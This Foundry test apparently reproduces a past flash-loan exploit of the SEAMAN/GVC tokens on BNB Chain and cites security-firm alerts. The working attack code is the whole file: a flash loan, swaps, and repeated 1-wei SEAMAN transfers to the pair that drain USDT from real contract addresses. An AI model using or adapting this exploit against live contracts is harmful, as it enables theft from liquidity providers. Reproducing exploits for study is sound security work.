//SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @Analysis
// https://twitter.com/peckshield/status/1597493955939405825
// https://twitter.com/CertiKAlert/status/1597513374841044993
// https://twitter.com/BeosinAlert/status/1597535796621631489
// @TX
// https://bscscan.com/tx/0x6f1af27d08b10caa7e96ec3d580bf39e29fd5ece00abda7d8955715403bf34a8

contract ContractTest is Test {
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 SEAMAN = IERC20(0x6bc9b4976ba6f8C9574326375204eE469993D038);
    IERC20 GVC = IERC20(0xDB95FBc5532eEb43DeEd56c8dc050c930e31017e);
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address dodo = 0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A;
    address Pair = 0x6637914482670f91F43025802b6755F27050b0a6;

    CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheat.createSelectFork("bsc", 23_467_515);
    }

    function testExploit() public {
        DVM(dodo).flashLoan(0, 800_000 * 1e18, address(this), new bytes(1));

        emit log_named_decimal_uint("[End] Attacker USDT balance after exploit", USDT.balanceOf(address(this)), 18);
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        USDT.approve(address(Router), type(uint256).max);
        USDTToSEAMAN();
        USDTToGVC();
        for (uint256 i = 0; i < 20; i++) {
            SEAMAN.transfer(Pair, 1);
        }
        GVCToUSDT();
        USDT.transfer(dodo, 800_000 * 1e18);
    }

    function USDTToSEAMAN() internal {
        address[] memory path = new address[](2);
        path[0] = address(USDT);
        path[1] = address(SEAMAN);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(10 * 1e9, 0, path, address(this), block.timestamp);
    }

    function USDTToGVC() internal {
        address[] memory path = new address[](2);
        path[0] = address(USDT);
        path[1] = address(GVC);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            500_000 * 1e18, 0, path, address(this), block.timestamp
        );
    }

    function GVCToUSDT() internal {
        GVC.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(GVC);
        path[1] = address(USDT);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            GVC.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }
}
